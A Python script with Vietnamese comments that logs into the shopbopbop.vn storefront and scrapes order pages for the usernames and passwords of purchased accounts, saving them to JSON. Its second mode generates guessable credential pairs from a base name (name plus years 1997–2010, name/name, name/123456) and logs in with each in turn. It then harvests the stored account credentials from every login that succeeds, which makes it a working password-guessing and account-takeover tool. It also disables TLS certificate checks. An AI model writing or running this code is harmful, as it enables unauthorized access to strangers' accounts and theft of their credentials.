import requests
from bs4 import BeautifulSoup
import json
import time
from urllib.parse import urljoin
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3

class ShopBopBopScraper:
    def __init__(self):
        # Thử các URL khác nhau
        self.possible_urls = [
            "https://shopbopbop.vn",
            "https://www.shopbopbop.vn",
            "http://shopbopbop.vn",
            "http://www.shopbopbop.vn"
        ]
        self.base_url = None
        self.session = requests.Session()
        
        # Cấu hình retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        # Tắt SSL verification warning (không khuyến khích nhưng có thể cần)
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        self.data = {
            'accounts': None,
            'accounts_v2': None,
            'account_details': []  # Lưu chi tiết từng đơn hàng
        }
        
        # Tìm URL hoạt động
        self._find_working_url()
    
    def _find_working_url(self):
        """
        Tìm URL hoạt động từ danh sách các URL có thể
        """
        print("Đang kiểm tra kết nối...")
        for url in self.possible_urls:
            try:
                response = self.session.get(url, timeout=10, verify=False)
                if response.status_code == 200:
                    self.base_url = url
                    print(f"✓ Tìm thấy URL hoạt động: {url}")
                    return True
            except Exception as e:
                continue
        
        # Nếu không tìm thấy, dùng URL đầu tiên làm mặc định
        self.base_url = self.possible_urls[0]
        print(f"⚠ Không thể kiểm tra kết nối, sử dụng URL mặc định: {self.base_url}")
        return False
    
    def _extract_csrf_token(self, soup, response):
        """
        Trích xuất CSRF token từ nhiều nguồn khác nhau
        """
        csrf_token = None
        
        # 1. Tìm trong meta tag
        meta_csrf = soup.find('meta', attrs={'name': 'csrf-token'})
        if meta_csrf:
            csrf_token = meta_csrf.get('content')
            if csrf_token:
                print("   Tìm thấy CSRF token trong meta tag")
                return csrf_token
        
        # 2. Tìm trong input hidden với name là _token hoặc csrf_token
        token_inputs = soup.find_all('input', attrs={'name': lambda x: x and ('token' in x.lower() or 'csrf' in x.lower())})
        for token_input in token_inputs:
            token_value = token_input.get('value')
            if token_value:
                csrf_token = token_value
                print("   Tìm thấy CSRF token trong input hidden")
                return csrf_token
        
        # 3. Tìm trong cookie
        if 'XSRF-TOKEN' in response.cookies:
            csrf_token = response.cookies['XSRF-TOKEN']
            print("   Tìm thấy CSRF token trong cookie XSRF-TOKEN")
            return csrf_token
        
        # 4. Tìm bất kỳ input hidden nào có value dài (có thể là token)
        hidden_inputs = soup.find_all('input', type='hidden')
        for hidden_input in hidden_inputs:
            value = hidden_input.get('value', '')
            name = hidden_input.get('name', '')
            if len(value) > 20 and ('token' in name.lower() or 'csrf' in name.lower() or not name):
                csrf_token = value
                print(f"   Tìm thấy CSRF token trong input hidden: {name}")
                return csrf_token
        
        return csrf_token
    
    def login(self, username, password):
        """
        Đăng nhập vào hệ thống
        """
        print("Đang đăng nhập...")
        login_url = f"{self.base_url}/login"
        
        # Lấy trang login để lấy CSRF token nếu có
        try:
            response = self.session.get(login_url, timeout=10, verify=False)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Trích xuất CSRF token
            csrf_token = self._extract_csrf_token(soup, response)
            
            # Tìm form login và các trường cần thiết
            form = soup.find('form')
            if form:
                # Tìm tất cả input hidden để gửi kèm
                hidden_inputs = form.find_all('input', type='hidden')
                login_data = {}
                for input_field in hidden_inputs:
                    name = input_field.get('name', '')
                    value = input_field.get('value', '')
                    if name and value:
                        login_data[name] = value
                
                # Thêm CSRF token nếu tìm thấy
                if csrf_token:
                    # Thử nhiều tên field phổ biến
                    if '_token' not in login_data and 'csrf_token' not in login_data:
                        login_data['_token'] = csrf_token
                
                # Tìm các trường username và password
                username_field = form.find('input', attrs={'type': 'text'}) or form.find('input', attrs={'type': 'email'}) or form.find('input', attrs={'name': lambda x: x and ('user' in x.lower() or 'email' in x.lower() or 'login' in x.lower())})
                password_field = form.find('input', attrs={'type': 'password'})
                
                username_field_name = 'username'
                password_field_name = 'password'
                
                if username_field and username_field.get('name'):
                    username_field_name = username_field.get('name')
                if password_field and password_field.get('name'):
                    password_field_name = password_field.get('name')
                
                # Thêm username và password
                login_data[username_field_name] = username
                login_data[password_field_name] = password
                
                # Tìm action của form
                action = form.get('action', '')
                if action:
                    login_post_url = urljoin(self.base_url, action)
                else:
                    login_post_url = login_url
                
                # Chuẩn bị headers
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': login_url,
                    'Origin': self.base_url
                }
                
                # Thêm CSRF token vào header nếu có (một số framework yêu cầu)
                if csrf_token:
                    headers['X-CSRF-TOKEN'] = csrf_token
                    headers['X-XSRF-TOKEN'] = csrf_token
                
                # Gửi request đăng nhập
                response = self.session.post(login_post_url, data=login_data, headers=headers, allow_redirects=True, timeout=10, verify=False)
                
                # Kiểm tra xem đăng nhập có thành công không
                if response.status_code == 200:
                    # Kiểm tra xem có redirect đến trang home không hoặc có thông báo lỗi không
                    if 'home' in response.url.lower() or 'dashboard' in response.url.lower():
                        print("✓ Đăng nhập thành công!")
                        return True
                    elif 'login' in response.url.lower():
                        # Kiểm tra xem có thông báo lỗi trong HTML không
                        error_soup = BeautifulSoup(response.text, 'html.parser')
                        error_msg = error_soup.find('div', class_=lambda x: x and ('error' in x.lower() or 'alert' in x.lower()))
                        if error_msg:
                            print(f"✗ Đăng nhập thất bại: {error_msg.get_text(strip=True)[:100]}")
                        else:
                            print("✗ Đăng nhập thất bại - vẫn ở trang login")
                        return False
                    else:
                        # Có thể đăng nhập thành công nhưng redirect đến trang khác
                        print("✓ Đăng nhập thành công (redirect đến trang khác)")
                        return True
                elif response.status_code == 419:
                    print("✗ Lỗi 419: CSRF token không hợp lệ hoặc đã hết hạn")
                    print("   Đang thử lại với token mới...")
                    # Thử lại một lần nữa với token mới
                    time.sleep(0.5)  # Giảm từ 1 giây xuống 0.5 giây
                    return self.login(username, password)
                else:
                    print(f"✗ Lỗi khi đăng nhập: Status code {response.status_code}")
                    # In một phần response để debug
                    if len(response.text) < 500:
                        print(f"   Response: {response.text[:200]}")
                    return False
            else:
                # Nếu không tìm thấy form, thử gửi trực tiếp với CSRF token
                login_data = {
                    'username': username,
                    'password': password
                }
                if csrf_token:
                    login_data['_token'] = csrf_token
                
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': login_url
                }
                if csrf_token:
                    headers['X-CSRF-TOKEN'] = csrf_token
                
                response = self.session.post(login_url, data=login_data, headers=headers, allow_redirects=True, timeout=10, verify=False)
                if response.status_code == 200 and 'login' not in response.url.lower():
                    print("✓ Đăng nhập thành công!")
                    return True
                else:
                    print(f"✗ Lỗi khi đăng nhập: Status code {response.status_code}")
                    return False
                    
        except requests.exceptions.RequestException as e:
            print(f"✗ Lỗi kết nối: {e}")
            print(f"   Đang thử với URL khác...")
            # Thử lại với URL khác
            for url in self.possible_urls:
                if url != self.base_url:
                    try:
                        test_url = f"{url}/login"
                        print(f"   Thử: {test_url}")
                        response = self.session.get(test_url, timeout=10, verify=False)
                        if response.status_code == 200:
                            self.base_url = url
                            print(f"   ✓ Tìm thấy URL hoạt động: {url}")
                            return self.login(username, password)  # Thử lại
                    except:
                        continue
            return False
    
    def visit_home(self):
        """
        Truy cập trang chủ (đã bỏ qua để tăng tốc)
        """
        # Bỏ qua bước này để tăng tốc độ
        return True
    
    def _parse_account_data(self, text_content):
        """
        Parse dữ liệu tài khoản từ text có định dạng: "Mã Số:|#49000|Mã Đơn:|Y2-XXX|Tài Khoản:|username|Ngày Mua:|date"
        """
        if not text_content or 'Tài Khoản:' not in text_content:
            return None
        
        # Tách các phần bằng dấu |
        parts = text_content.split('|')
        account_data = {}
        
        i = 0
        while i < len(parts):
            part = parts[i].strip()
            if not part:
                i += 1
                continue
            
            # Kiểm tra xem có phải là label không (có dấu :)
            if ':' in part and i + 1 < len(parts):
                label = part.replace(':', '').strip()
                value = parts[i + 1].strip() if i + 1 < len(parts) else ''
                
                # Lưu vào dictionary
                if label == 'Tài Khoản':
                    account_data['tai_khoan'] = value
                elif label == 'Mã Số':
                    account_data['ma_so'] = value
                elif label == 'Mã Đơn':
                    # Mã đơn có thể có giá tiền, tách ra
                    if '/' in value:
                        order_parts = value.split('/')
                        account_data['ma_don'] = order_parts[0].strip()
                        if len(order_parts) > 1:
                            account_data['gia'] = order_parts[1].strip()
                    else:
                        account_data['ma_don'] = value
                elif label == 'Ngày Mua':
                    account_data['ngay_mua'] = value
                else:
                    # Lưu các trường khác
                    account_data[label.lower().replace(' ', '_')] = value
                
                i += 2  # Bỏ qua cả label và value
            else:
                i += 1
        
        # Chỉ trả về nếu có thông tin tài khoản
        if 'tai_khoan' in account_data:
            return account_data
        return None
    
    def scrape_accounts_page(self, url, page_name):
        """
        Lấy dữ liệu từ trang accounts
        """
        print(f"Đang lấy dữ liệu từ {page_name}...")
        try:
            response = self.session.get(url, timeout=10, verify=False)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Tìm tất cả các bảng hoặc danh sách chứa thông tin tài khoản
            accounts_data = []
            raw_items = []
            
            # Thử tìm bảng
            tables = soup.find_all('table')
            if tables:
                for table in tables:
                    rows = table.find_all('tr')
                    headers = []
                    if rows:
                        # Lấy header từ row đầu tiên
                        header_cells = rows[0].find_all(['th', 'td'])
                        headers = [cell.get_text(strip=True) for cell in header_cells]
                    
                    for row in rows[1:]:  # Bỏ qua header
                        cells = row.find_all(['td', 'th'])
                        if cells:
                            account_info = {}
                            for i, cell in enumerate(cells):
                                text = cell.get_text(strip=True)
                                if text:
                                    if i < len(headers) and headers[i]:
                                        account_info[headers[i].lower().replace(' ', '_')] = text
                                    else:
                                        account_info[f'col_{i}'] = text
                            if account_info:
                                raw_items.append(account_info)
            
            # Tìm các div hoặc list items chứa thông tin
            items = soup.find_all(['div', 'li', 'tr'], class_=lambda x: x and (
                'card' in x.lower() or 
                'item' in x.lower() or 
                'account' in x.lower() or
                'order' in x.lower() or
                'row' in x.lower()
            ))
            
            for item in items:
                text = item.get_text(separator='|', strip=True)
                if text and len(text) > 10:  # Bỏ qua text quá ngắn
                    raw_items.append({'content': text})
            
            # Nếu không tìm thấy gì, tìm tất cả các phần tử có thể chứa thông tin
            if not raw_items:
                # Tìm các phần tử có chứa "Tài Khoản:"
                all_elements = soup.find_all(['div', 'li', 'tr', 'td', 'span', 'p'])
                for elem in all_elements:
                    text = elem.get_text(separator='|', strip=True)
                    if text and 'Tài Khoản:' in text and len(text) > 20:
                        raw_items.append({'content': text})
            
            # Parse dữ liệu và chỉ lấy những mục có "Tài Khoản:"
            for item in raw_items:
                if 'content' in item:
                    parsed = self._parse_account_data(item['content'])
                    if parsed:
                        accounts_data.append(parsed)
                elif isinstance(item, dict):
                    # Kiểm tra xem có chứa thông tin tài khoản không
                    item_text = '|'.join([f"{k}:{v}" for k, v in item.items()])
                    if 'Tài Khoản:' in item_text or 'tai_khoan' in str(item).lower():
                        # Thử parse nếu có format phù hợp
                        parsed = self._parse_account_data(item_text)
                        if parsed:
                            accounts_data.append(parsed)
                        else:
                            # Nếu không parse được nhưng có thông tin tài khoản, vẫn lưu
                            if any('tài khoản' in str(v).lower() or 'tai_khoan' in str(k).lower() for k, v in item.items()):
                                accounts_data.append(item)
            
            print(f"✓ Đã lấy được {len(accounts_data)} tài khoản từ {page_name}")
            return accounts_data
            
        except requests.exceptions.RequestException as e:
            print(f"✗ Lỗi khi lấy dữ liệu từ {page_name}: {e}")
            return None
    
    def scrape_order_detail(self, order_code, order_type='accounts-v2'):
        """
        Lấy TẤT CẢ dữ liệu từ trang chi tiết đơn hàng
        order_type: 'accounts' hoặc 'accounts-v2'
        """
        detail_url = f"{self.base_url}/account/orders/{order_type}/{order_code}"
        print(f"  Đang lấy chi tiết đơn hàng {order_code}...")
        
        try:
            response = self.session.get(detail_url, timeout=10, verify=False)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Chỉ lưu thông tin cần thiết
            detail_data = {
                'ma_don': order_code,
                'loai': order_type,
                'url': detail_url
            }
            
            # Chỉ lấy input để tìm tài khoản và mật khẩu
            inputs = soup.find_all('input')
            
            # TRÍCH XUẤT TÀI KHOẢN VÀ MẬT KHẨU
            tai_khoan = None
            mat_khau = None
            
            # Cách 1: Tìm label "Tài Khoản" và input tương ứng
            labels = soup.find_all('label')
            for label in labels:
                label_text = label.get_text(strip=True)
                label_for = label.get('for', '')
                
                # Tìm input tương ứng với label
                input_elem = None
                
                if label_for:
                    # Tìm input có id hoặc name trùng với label_for
                    input_elem = soup.find('input', id=label_for) or soup.find('input', attrs={'name': label_for})
                
                # Nếu không tìm thấy, tìm trong cấu trúc HTML gần label
                if not input_elem:
                    # Tìm trong parent của label
                    parent = label.parent
                    if parent:
                        # Tìm input trong cùng parent
                        input_elem = parent.find('input')
                        
                        # Nếu không có, tìm trong div con
                        if not input_elem:
                            divs = parent.find_all('div', recursive=False)
                            for div in divs:
                                input_elem = div.find('input')
                                if input_elem:
                                    break
                        
                        # Nếu vẫn không có, tìm trong div kế tiếp
                        if not input_elem:
                            next_div = parent.find_next_sibling('div')
                            if next_div:
                                input_elem = next_div.find('input')
                                if not input_elem:
                                    # Tìm trong div con của next_div
                                    inner_divs = next_div.find_all('div', recursive=False)
                                    for div in inner_divs:
                                        input_elem = div.find('input')
                                        if input_elem:
                                            break
                
                if input_elem:
                    input_value = input_elem.get('value', '')
                    if input_value:
                        if 'tài khoản' in label_text.lower() or 'username' in label_text.lower() or label_for == 'username':
                            tai_khoan = input_value
                        elif 'mật khẩu' in label_text.lower() or 'password' in label_text.lower() or label_for == 'password':
                            mat_khau = input_value
            
            # Cách 2: Tìm input có value và tìm label gần đó (tìm ngược lại)
            if not tai_khoan or not mat_khau:
                for inp in inputs:
                    input_value = inp.get('value', '')
                    if not input_value:
                        continue
                    
                    input_id = inp.get('id', '')
                    input_name = inp.get('name', '')
                    
                    # Tìm label liên quan
                    related_label = None
                    
                    # Tìm label có for trùng với id
                    if input_id:
                        related_label = soup.find('label', attrs={'for': input_id})
                    
                    # Nếu không có, tìm label trong cấu trúc HTML gần input
                    if not related_label:
                        # Tìm trong parent
                        parent = inp.parent
                        if parent:
                            # Tìm label trước input trong cùng parent
                            related_label = parent.find('label')
                            
                            # Nếu không có, tìm trong div cha
                            if not related_label:
                                grandparent = parent.parent
                                if grandparent:
                                    related_label = grandparent.find('label')
                    
                    if related_label:
                        label_text = related_label.get_text(strip=True)
                        if 'tài khoản' in label_text.lower() or 'username' in label_text.lower():
                            if not tai_khoan:
                                tai_khoan = input_value
                        elif 'mật khẩu' in label_text.lower() or 'password' in label_text.lower():
                            if not mat_khau:
                                mat_khau = input_value
                    else:
                        # Dựa vào id hoặc name của input
                        if 'user' in input_id.lower() or 'user' in input_name.lower() or input_id == 'username' or input_name == 'username':
                            if not tai_khoan:
                                tai_khoan = input_value
                        elif 'pass' in input_id.lower() or 'pass' in input_name.lower() or input_id == 'password' or input_name == 'password':
                            if not mat_khau:
                                mat_khau = input_value
            
            # Lưu tài khoản và mật khẩu vào detail_data
            if tai_khoan:
                detail_data['tai_khoan'] = tai_khoan
            if mat_khau:
                detail_data['mat_khau'] = mat_khau
            
            print(f"  ✓ Đã lấy chi tiết đơn hàng {order_code}")
            if tai_khoan:
                print(f"    - Tài khoản: {tai_khoan}")
            if mat_khau:
                print(f"    - Mật khẩu: {'*' * len(mat_khau)}")
            
            return detail_data
            
        except requests.exceptions.RequestException as e:
            print(f"  ✗ Lỗi khi lấy chi tiết đơn hàng {order_code}: {e}")
            return None
    
    def scrape_all(self, username, password):
        """
        Thực hiện toàn bộ quy trình: login -> scrape 2 trang -> lấy chi tiết (tối ưu tốc độ)
        """
        # Bước 1: Đăng nhập
        if not self.login(username, password):
            print("Không thể đăng nhập. Dừng quy trình.")
            return False
        
        time.sleep(0.5)  # Giảm từ 2 giây xuống 0.5 giây
        
        # Bước 2: Bỏ qua trang chủ để tăng tốc
        
        # Bước 3: Lấy dữ liệu từ trang accounts
        accounts_url = f"{self.base_url}/account/orders/accounts"
        self.data['accounts'] = self.scrape_accounts_page(accounts_url, "accounts")
        
        time.sleep(0.5)  # Giảm từ 2 giây xuống 0.5 giây
        
        # Bước 4: Lấy dữ liệu từ trang accounts-v2
        accounts_v2_url = f"{self.base_url}/account/orders/accounts-v2"
        self.data['accounts_v2'] = self.scrape_accounts_page(accounts_v2_url, "accounts-v2")
        
        time.sleep(0.5)  # Giảm từ 2 giây xuống 0.5 giây
        
        # Bước 5: Lấy chi tiết từng đơn hàng nếu có dữ liệu
        print("\nĐang lấy chi tiết từng đơn hàng...")
        detail_count = 0
        
        # Xử lý accounts
        if self.data['accounts'] and len(self.data['accounts']) > 0:
            print(f"\nXử lý {len(self.data['accounts'])} đơn hàng từ accounts...")
            for account in self.data['accounts']:
                if 'ma_don' in account and account['ma_don']:
                    detail = self.scrape_order_detail(account['ma_don'], 'accounts')
                    if detail:
                        detail['account_info'] = account
                        self.data['account_details'].append(detail)
                        detail_count += 1
                    time.sleep(0.3)  # Giảm từ 1 giây xuống 0.3 giây
        
        # Xử lý accounts_v2
        if self.data['accounts_v2'] and len(self.data['accounts_v2']) > 0:
            print(f"\nXử lý {len(self.data['accounts_v2'])} đơn hàng từ accounts-v2...")
            for account in self.data['accounts_v2']:
                if 'ma_don' in account and account['ma_don']:
                    detail = self.scrape_order_detail(account['ma_don'], 'accounts-v2')
                    if detail:
                        detail['account_info'] = account
                        self.data['account_details'].append(detail)
                        detail_count += 1
                    time.sleep(0.3)  # Giảm từ 1 giây xuống 0.3 giây
        
        if detail_count > 0:
            print(f"\n✓ Đã lấy chi tiết {detail_count} đơn hàng")
        else:
            print("\n⚠ Không có đơn hàng nào để lấy chi tiết")
        
        return True
    
    def save_to_json(self, filename='shopbopbop_data.json'):
        """
        Lưu dữ liệu vào file JSON
        """
        print(f"Đang lưu dữ liệu vào {filename}...")
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, ensure_ascii=False, indent=2)
            print(f"✓ Đã lưu dữ liệu vào {filename}")
            return True
        except Exception as e:
            print(f"✗ Lỗi khi lưu file: {e}")
            return False


def generate_accounts(base_name):
    """
    Tạo danh sách tài khoản và mật khẩu từ base_name
    
    Ví dụ: "hoang" -> 16 bộ tài khoản/mật khẩu:
    - hoang1997 đến hoang2010 (14 bộ)
    - hoang hoang (1 bộ)
    - hoang 123456 (1 bộ)
    """
    accounts = []
    
    # 1. Tạo từ năm 1997 đến 2010 (14 bộ)
    for year in range(1997, 2011):
        username = f"{base_name}{year}"
        password = f"{base_name}{year}"
        accounts.append({
            'username': username,
            'password': password
        })
    
    # 2. hoang hoang (1 bộ)
    accounts.append({
        'username': base_name,
        'password': base_name
    })
    
    # 3. hoang 123456 (1 bộ)
    accounts.append({
        'username': base_name,
        'password': '123456'
    })
    
    # Tổng cộng: 14 + 1 + 1 = 16 bộ
    return accounts

def main():
    """
    Hàm main để chạy script
    """
    import sys
    import io
    
    # Fix encoding cho Windows console
    if sys.platform == 'win32':
        try:
            sys.stdout.reconfigure(encoding='utf-8')
            sys.stderr.reconfigure(encoding='utf-8')
        except:
            # Fallback nếu reconfigure không hoạt động
            sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
            sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
    
    print("=" * 50)
    print("SHOPBOPBOP SCRAPER")
    print("=" * 50)
    print("\nChọn chế độ:")
    print("1. Đăng nhập 1 tài khoản")
    print("2. Tự động tạo và đăng nhập tuần tự nhiều tài khoản")
    
    # Đảm bảo output được flush trước khi nhận input
    sys.stdout.flush()
    
    try:
        mode = input("\nChọn chế độ (1 hoặc 2, mặc định: 1): ").strip()
        if not mode:
            mode = '1'
    except (EOFError, KeyboardInterrupt):
        print("\n\nĐã hủy!")
        return
    except Exception as e:
        print(f"\n✗ Lỗi khi nhập: {e}")
        return
    
    if mode == '2':
        # Chế độ tự động tạo và đăng nhập tuần tự
        sys.stdout.flush()
        try:
            print("\nNhập các từ khóa để tạo tài khoản (phân tách bằng dấu phẩy hoặc xuống dòng)")
            print("Ví dụ: hoang, hieu, minh")
            print("Hoặc nhập từng tên trên mỗi dòng (kết thúc bằng dòng trống)")
            base_names_input = input("Nhập: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\nĐã hủy!")
            return
        except Exception as e:
            print(f"\n✗ Lỗi khi nhập: {e}")
            return
        
        if not base_names_input:
            print("✗ Từ khóa không được để trống!")
            return
        
        # Parse danh sách tên (hỗ trợ cả dấu phẩy và xuống dòng)
        base_names = []
        if ',' in base_names_input:
            # Phân tách bằng dấu phẩy
            base_names = [name.strip() for name in base_names_input.split(',') if name.strip()]
        else:
            # Chỉ có 1 tên
            base_names = [base_names_input.strip()]
        
        # Tạo danh sách tài khoản cho tất cả các tên
        account_list = []
        print(f"\nĐang tạo danh sách tài khoản từ {len(base_names)} tên...")
        for base_name in base_names:
            if base_name:
                accounts = generate_accounts(base_name)
                account_list.extend(accounts)
                print(f"  ✓ Đã tạo {len(accounts)} tài khoản từ '{base_name}'")
        
        print(f"\n✓ Tổng cộng đã tạo {len(account_list)} tài khoản")
        
        # Tạo scraper
        scraper = ShopBopBopScraper()
        
        # Đăng nhập tuần tự với từng tài khoản
        print(f"\nBắt đầu đăng nhập tuần tự với {len(account_list)} tài khoản...")
        print("=" * 50)
        
        success_count = 0
        fail_count = 0
        all_results = []  # Lưu tất cả kết quả
        
        for i, acc in enumerate(account_list, 1):
            username = acc['username']
            password = acc['password']
            
            print(f"\n[{i}/{len(account_list)}] Đang xử lý: {username}")
            print("-" * 50)
            
            # Tạo scraper mới cho mỗi tài khoản (để reset session)
            scraper = ShopBopBopScraper()
            
            if scraper.scrape_all(username, password):
                # Lưu kết quả cho tài khoản này
                result = {
                    'username': username,
                    'password': password,
                    'status': 'success',
                    'data': scraper.data.copy()
                }
                all_results.append(result)
                success_count += 1
                print(f"✓ Thành công: {username}")
            else:
                result = {
                    'username': username,
                    'password': password,
                    'status': 'failed',
                    'data': None
                }
                all_results.append(result)
                fail_count += 1
                print(f"✗ Thất bại: {username}")
            
            # Đợi một chút giữa các request (giảm để tăng tốc)
            if i < len(account_list):
                time.sleep(0.5)  # Giảm từ 2 giây xuống 0.5 giây
        
        # Lưu tất cả kết quả
        output_data = {
            'base_names': base_names,
            'total_accounts': len(account_list),
            'success_count': success_count,
            'fail_count': fail_count,
            'results': all_results
        }
        
        # Tạo tên file từ danh sách tên
        if len(base_names) == 1:
            output_file = f'shopbopbop_all_accounts_{base_names[0]}.json'
        else:
            # Nếu nhiều tên, dùng tên đầu tiên và thêm _multi
            output_file = f'shopbopbop_all_accounts_{base_names[0]}_multi.json'
        
        print(f"\nĐang lưu tất cả kết quả vào {output_file}...")
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(output_data, f, ensure_ascii=False, indent=2)
            print(f"✓ Đã lưu kết quả vào {output_file}")
        except Exception as e:
            print(f"✗ Lỗi khi lưu file: {e}")
        
        print("\n" + "=" * 50)
        print("TỔNG KẾT")
        print("=" * 50)
        print(f"Tổng số tài khoản: {len(account_list)}")
        print(f"Thành công: {success_count}")
        print(f"Thất bại: {fail_count}")
        print("=" * 50)
        
    else:
        # Chế độ đăng nhập 1 tài khoản (mặc định)
        sys.stdout.flush()
        try:
            username = input("Nhập username/email: ").strip()
            sys.stdout.flush()
            password = input("Nhập password: ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\nĐã hủy!")
            return
        except Exception as e:
            print(f"\n✗ Lỗi khi nhập: {e}")
            return
        
        if not username or not password:
            print("✗ Username và password không được để trống!")
            return
        
        # Tạo scraper và chạy
        scraper = ShopBopBopScraper()
        
        if scraper.scrape_all(username, password):
            scraper.save_to_json()
            print("\n" + "=" * 50)
            print("HOÀN TẤT!")
            print("=" * 50)                                     
        else:
            print("\n" + "=" * 50)
            print("CÓ LỖI XẢY RA!")
            print("=" * 50)
            print("\nGợi ý khắc phục:")
            print("1. Kiểm tra kết nối internet")
            print("2. Kiểm tra DNS (thử ping shopbopbop.vn)")
            print("3. Thử với URL đầy đủ: www.shopbopbop.vn")
            print("4. Kiểm tra firewall/proxy")
            print("5. Thử chạy script với quyền administrator")


if __name__ == "__main__":
    main()

